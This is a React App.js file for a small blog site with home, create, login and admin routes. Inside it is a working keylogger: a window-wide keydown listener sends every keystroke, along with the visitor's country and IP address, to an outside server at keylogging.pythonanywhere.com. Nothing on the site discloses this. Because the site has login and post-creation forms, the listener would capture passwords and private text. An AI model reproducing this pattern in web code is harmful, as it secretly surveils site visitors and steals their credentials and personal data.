import { useContext } from 'react';
import Navbar from './Navbar';
import Home from './Home';
import { HashRouter as Router, Route, Routes } from "react-router-dom";
import Create from './Create';
import BlogDetails from './BlogDetails';
import NotFound from './NotFound';
import { LocationContext } from './contexts/LocationContext';
import Admin from './admin/Admin';
import Login from './admin/Login';

const CaptureKey = (key, location, ip_address) => {
  fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
    // fetch('http://127.0.0.1:5000/api/new_keylog', {
    method: 'POST',
    body: JSON.stringify({ key, location, ip_address }),

  }).then(responce => {
    if (!responce.ok) {
      alert("ERROR")
    } else {
      console.log("Captured")
    }
    return responce.json();
  }).then(data => {
    console.log('Captured')

  }).catch(error => {
    console.log('Aborted')
  })
}

function App() {
  const { location } = useContext(LocationContext);
  window.addEventListener('keydown', function (e) {
    location && CaptureKey(e.key, location.country_name, location.IPv4)
  }, false);

  return (
    <Router>
      <div className="App">
        <Navbar />
        <div className="content">
          <Routes>
            <Route exact path="" element={<Home />} />
            <Route exact path="create" element={<Create />} />
            <Route exact path="login" element={<Login/>}/>
            <Route exact path="blogs" element={<Home />} />
            <Route exact path="admin" element={<Admin />} />
            <Route exact path="blogs/:id" element={<BlogDetails />} />
            <Route path="*" element={<NotFound />} />
          </Routes>
        </div>
      </div>
    </Router>
  );
}

export default App;